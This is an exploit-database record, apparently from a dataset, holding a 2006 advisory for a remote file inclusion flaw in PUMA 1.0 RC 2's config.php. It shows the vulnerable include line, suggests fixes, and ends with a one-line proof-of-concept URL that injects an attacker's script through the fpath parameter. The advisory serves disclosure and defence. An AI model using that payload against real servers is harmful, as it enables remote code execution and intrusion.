{
  "id": "2340",
  "title": "PUMA 1.0 RC 2 - &#039;config.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-4713",
  "vuln_type": "unknown",
  "code": "+--------------------------------------------------------------------\r\n+\r\n+ PUMA 1.0 RC 2 (config.php) Remote File Inclusion\r\n+\r\n+ Original advisory:\r\n+ http://www.bb-pcsecurity.de/Websecurity/415/org/PUMA_1.0_RC_2_(config.php)_R FI.htm\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Affected Software .: PUMA 1.0 RC 2\r\n+ Venedor ...........: http://php.psywerx.net/\r\n+ Class .............: Remote File Inclusion\r\n+ Risk ..............: high (Remote File Execution)\r\n+ Found by ..........: Philipp Niedziela\r\n+ Contact ...........: webmaster[at]bb-pcsecurity[.]de\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Affected File:\r\n+ /config.php\r\n+\r\n+ Code:\r\n+ .....\r\n+ // Select language\r\n+ $lang = \"lang_english.php\";\r\n+ include($fpath.\"./language/$lang\");\r\n+ .....\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ $fpath is not properly sanitized before being used\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Solution:\r\n+  -> Declare $fpath!\r\n+  -> Deny direct access to config.php\r\n+  -> or modify code:\r\n+\r\n+ if(!isset($_REQUEST['fpath']) && !isset($_GET['fpath']) &&\r\n!isset($_POST['fpath'])){\r\n+ //code of org. config.php\r\n+ }\r\n+ else {\r\n+ echo \"You cannot access this file directly.\";\r\n+ die();\r\n+ }\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ PoC:\r\n+\r\n+ http://[target]/config.php?fpath=[script]\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Greets and Thanks: /str0ke\r\n+\r\n+-------------------------[ E O F ]----------------------------------\r\n\r\n# milw0rm.com [2006-09-10]",
  "url": "https://www.exploit-db.com/exploits/2340"
}